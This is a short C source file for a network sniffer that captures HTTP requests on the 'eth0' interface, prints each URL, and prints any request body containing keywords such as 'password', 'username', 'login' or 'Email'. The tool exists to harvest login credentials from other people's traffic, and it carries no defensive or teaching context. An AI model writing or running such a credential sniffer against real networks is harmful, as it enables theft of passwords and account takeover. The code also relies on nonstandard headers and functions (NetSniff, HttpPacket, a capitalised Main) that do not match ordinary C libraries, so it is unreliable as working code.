#include "stdlib.h"
#include "types.h"
#include "net.h"
#include "http.h"

void sniff(char *interface);
void process_packets(HttpPacket *packet);

char *words[] = {"password", "user", "username", "login", "pass", "Username", "Password", "User", "Email"};

void Main()
{
    sniff("eth0");
}

void sniff(char *interface)
{
    while (1) {
        NetSniff(interface, process_packets);
    }
}

void process_packets(HttpPacket *packet)
{
    if (packet->type == PACKET_HTTP_REQUEST) {
        char *url = (char *)malloc(strlen(packet->url.host) + strlen(packet->url.path) + 1);
        sprintf(url, "%s%s", packet->url.host, packet->url.path);
        printf("URL: %s\n", url);
        if (packet->payload_len > 0) {
            char *payload = (char *)malloc(packet->payload_len + 1);
            memcpy(payload, packet->payload, packet->payload_len);
            payload[packet->payload_len] = '\0';
            for (int i = 0; i < 9; i++) {
                if (strstr(payload, words[i])) {
                    printf("Load: %s\n", payload);
                    break;
                }
            }
            free(payload);
        }
        free(url);
    }
}
